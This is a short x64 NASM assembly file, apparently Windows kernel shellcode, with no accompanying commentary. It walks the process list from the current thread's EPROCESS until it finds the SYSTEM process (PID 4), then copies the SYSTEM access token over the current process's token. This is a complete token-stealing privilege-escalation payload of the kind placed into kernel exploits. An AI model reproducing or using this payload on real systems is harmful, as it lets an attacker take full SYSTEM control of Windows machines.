BITS 64

section .text

xor rax, rax
xor r9, r9
xor rcx, rcx

mov rax, qword [gs:0x188]
mov rax, qword [rax + 0x220]
mov r9, rax

GetSystemProcess:
	mov r9, qword [r9 + 0x2f0]
	sub r9, 0x2f0
	mov rcx, qword [r9 + 0x2e8]
	cmp rcx, 4
	jne GetSystemProcess

add rax, 0x358

mov r9, qword [r9 + 0x358]
mov [rax], r9

nop

ret

end